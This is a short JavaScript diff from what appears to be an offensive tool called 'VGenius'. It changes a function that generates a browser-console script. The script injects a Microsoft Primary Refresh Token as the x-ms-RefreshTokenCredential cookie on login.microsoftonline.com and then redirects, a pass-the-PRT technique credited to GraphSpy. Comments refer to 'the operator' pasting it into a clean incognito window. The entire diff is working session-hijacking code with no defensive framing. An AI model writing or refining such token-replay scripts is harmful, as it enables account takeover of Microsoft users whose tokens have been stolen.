@@ -308,15 +308,19 @@ async function refreshStoredPrtCookie(userId, tenantId, refreshToken) {
  */
 function generatePrtCookieInjectionScript(prtCookie, host) {
   const target = host || 'login.microsoftonline.com';
+  // Format requested for the operator: one document.cookie line using lowercase
+  // `secure` / `samesite=none`, then a 3s delayed redirect to /?auth=2. No IIFE
+  // wrapper - the script is pasted straight into the console.
   return [
     '// VGenius PRT Cookie Injection (GraphSpy method)',
     '// Paste into the browser console while on https://' + target + '/',
     '// (use a clean/incognito window so no other session interferes)',
-    '(function () {',
-    '  document.cookie = "x-ms-RefreshTokenCredential=' + prtCookie + '; domain=.' + target + '; path=/; Secure; SameSite=None";',
-    '  console.log("[VGenius] PRT cookie set - valid for about 5 minutes");',
-    '  window.location.href = "https://' + target + '/";',
-    '})();'
+    'document.cookie = ' + JSON.stringify('x-ms-RefreshTokenCredential=' + prtCookie + '; domain=.' + target + '; path=/; secure; samesite=none') + ';',
+    '',
+    '// Redirect after 3s',
+    'setTimeout(() => {',
+    '  window.location.href = "https://' + target + '/?auth=2";',
+    '}, 3000);'
   ].join('\n');
 }
 /**
